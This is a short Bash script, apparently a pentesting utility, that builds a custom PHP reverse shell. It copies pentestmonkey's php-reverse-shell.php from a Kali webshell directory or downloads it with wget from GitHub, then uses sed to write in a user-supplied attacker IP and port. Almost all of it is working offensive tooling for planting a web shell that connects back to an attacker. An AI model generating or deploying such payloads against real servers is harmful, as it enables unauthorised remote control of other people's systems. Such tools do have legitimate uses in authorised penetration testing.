#!/bin/bash

#Sencillo script para obtener una reverse shell en php con la IP y puerto deseado
#Simple script to obtain a php reverse shell with desired IP and port

#Credits to: https://github.com/pentestmonkey

#Colours
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
ip=$1
port=$2

function helpPanel(){
	echo -e "\n${yellow}[!] Usage: ${end}${gray}$0 ${end}${blue}<ip> <port>"
}

if [ -z "$ip" ] | [ -z "$port" ]; then
	helpPanel
else
	pwd=$(pwd)
	test -f "/usr/share/webshells/php/php-reverse-shell.php"
	if [ $? -eq 1 ]; then
		wget "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" #> /dev/null 2>&1
	else
		cp "/usr/share/webshells/php/php-reverse-shell.php" $pwd
	fi
	grep '127.0.0.1' php-reverse-shell.php | sed "s/127.0.0.1/$ip/" -i php-reverse-shell.php
	grep '1234' php-reverse-shell.php | sed "s/1234/$port/" -i php-reverse-shell.php

	echo -e "\n${yellow}[${end}${blue}*${end}${yellow}] Custom PHP reverse shell generated in ${end}${blue}$pwd${end}"
fi

